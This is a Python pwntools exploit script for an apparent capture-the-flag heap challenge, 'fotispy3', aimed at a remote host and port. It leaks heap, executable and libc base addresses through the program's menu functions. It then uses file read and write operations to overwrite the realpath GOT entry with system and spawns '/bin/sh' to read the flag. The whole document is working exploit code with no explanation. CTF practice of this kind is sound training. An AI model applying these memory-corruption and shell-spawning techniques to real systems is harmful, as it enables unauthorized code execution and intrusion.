#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5193
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy3_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001CD8
            # fread
            brva 0x00000000000021A1
            # fwrite
            brva 0x00000000000022F1
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def register(username, password):
    p.sendlineafter(b'[7]: ', str(0))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def login(username, password):
    p.sendlineafter(b'[7]: ', str(1))
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def add(song_title, author, album):
    p.sendlineafter(b'[7]: ', str(2))
    p.sendlineafter(b'title: ', song_title)
    p.sendlineafter(b'from: ', author)
    p.sendlineafter(b'on: ', album)

def show(choice):
    p.sendlineafter(b'[7]: ', str(3))
    p.sendlineafter(b'edit: ', str(choice))

def edit(slot, choice, data):
    p.sendlineafter(b'[7]: ', str(4))
    p.sendlineafter(b'edit: ', str(slot))
    p.sendlineafter(b'change: ', str(choice))
    p.sendlineafter(b'info: ', data)

def open_file(path):
    p.sendlineafter(b'[7]: ', str(5))
    p.sendlineafter(b'path: ', path)

def read_file(num):
    p.sendlineafter(b'[7]: ', str(6))
    p.sendlineafter(b'read: ', str(num))

def write_file(num, data):
    p.sendlineafter(b'[7]: ', str(7))
    p.sendlineafter(b'read: ', str(num))
    p.sendafter(b'data: ', data)

# VARIABLE
gadget = [0x4c139, 0x4c140, 0xd515f]

# PAYLOAD

# Leak heap
register(b'nhh', b'abcdxyz')
register(b'nhh1', b'abcdxyz1')
login(b'nhh', b'abcdxyz')

show(0x12)
p.recvuntil(b'    - Song: ')
heap_leak = u64(p.recv(6) + b'\0'*2)
heap_base = heap_leak - 0x720
log.info("Heap base: " + hex(heap_base))

# Avoid merge with top chunk & leak exe
open_file(b'/code/nhh')
write_file(0x30, b'a'*0x30)
read_file(0x30)
p.recvuntil(b'a'*0x30)
exe_leak = u64(p.recv(6) + b'\0'*2)
exe.address = exe_leak - 0x5140
log.info("Exe base: " + hex(exe.address))

show(0x26)
p.recvuntil(b'\0'*16 + b' - ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym._IO_2_1_stderr_
log.info("Libc base: " + hex(libc.address))

payload = p64(exe.address + 0x5140) + p64(0) + p64(exe.got.realpath - 0x20)
write_file(0x48, payload)
read_file(0x48)

edit(0, 0, p64(libc.sym.system))

open_file(b'/bin/sh')
p.sendline(b'cat flag.txt')

p.interactive()